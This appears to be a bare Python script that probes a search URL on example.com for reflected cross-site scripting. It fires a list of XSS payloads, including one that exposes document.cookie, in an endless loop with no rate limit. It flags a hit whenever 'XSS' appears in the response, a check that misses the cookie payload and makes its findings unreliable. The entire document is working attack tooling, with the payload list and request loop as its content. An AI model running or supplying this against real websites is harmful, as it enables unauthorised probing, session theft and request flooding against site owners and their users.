import requests
import random

payloads = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src='x' onerror='alert(\"XSS\")'/>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>"
]

url = "http://example.com/search?q="

while True:
    payload = random.choice(payloads)
    try:
        r = requests.get(url + payload)
    except:
        print("An error occurred while requesting: " + url + payload)
        continue
    if "XSS" in r.text:
        print("Possible XSS vulnerability found: " + url + payload)
    else:
        print("No vulnerability found.")
